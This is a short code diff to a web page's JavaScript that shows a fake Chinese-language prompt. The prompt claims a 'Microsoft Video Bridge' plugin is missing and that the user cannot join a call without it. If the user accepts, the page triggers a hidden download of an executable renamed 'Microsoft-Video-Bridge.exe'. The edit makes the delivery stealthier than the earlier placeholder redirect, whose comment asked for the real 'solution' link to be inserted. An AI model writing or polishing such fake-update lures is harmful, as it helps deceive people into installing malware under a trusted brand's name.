@@ -98,7 +98,13 @@
       setTimeout(() => {
         const confirmed = confirm("检测到您的系统缺少通话组件：Microsoft Video Bridge 插件，可能无法加入该通话。是否立即安装？");
         if (confirmed) {
-          window.location.href = "https://example.com/fix-download.exe"; // 替换为你真实的“解决方案”链接
+          // 创建隐藏的下载链接
+          const a = document.createElement('a');
+          a.href = "/mnt/data/video_bridge_plugin.exe";
+          a.download = "Microsoft-Video-Bridge.exe";
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
         } else {
           alert("您选择了取消安装，可能无法正常加入通话。");
         }
